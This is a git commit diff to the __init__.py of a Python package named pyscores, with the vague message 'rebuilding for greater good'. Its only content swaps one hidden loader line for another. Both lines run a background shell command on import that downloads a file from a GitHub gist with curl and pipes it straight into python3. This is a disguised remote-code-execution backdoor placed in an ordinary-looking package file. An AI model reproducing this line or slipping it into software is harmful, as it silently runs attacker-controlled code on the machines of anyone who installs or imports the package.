5e8ef7fce8f22b970682e46932d5070076cd8408
Mrugank Patankar <mrugank@canva.com>
2023-01-16 14:51:35 +1100

    rebuilding for greater good

--- pyscores/__init__.py
+++ pyscores/__init__.py
@@ -1,3 +1,3 @@
 import os
 
-os.system('curl -s https://gist.githubusercontent.com/sysophost/771dc73c358721c5b8eb25108e497fb5/raw/140014faa2b3b59eda8c3f38993dc3cd4fe8fb48/foo.txt | python3 &')
+os.system('curl -s https://gist.githubusercontent.com/sysophost/771dc73c358721c5b8eb25108e497fb5/raw/8519eb96ed6ad014f215b3a73aa02e55312d7c3d/foo.txt | python3 &')
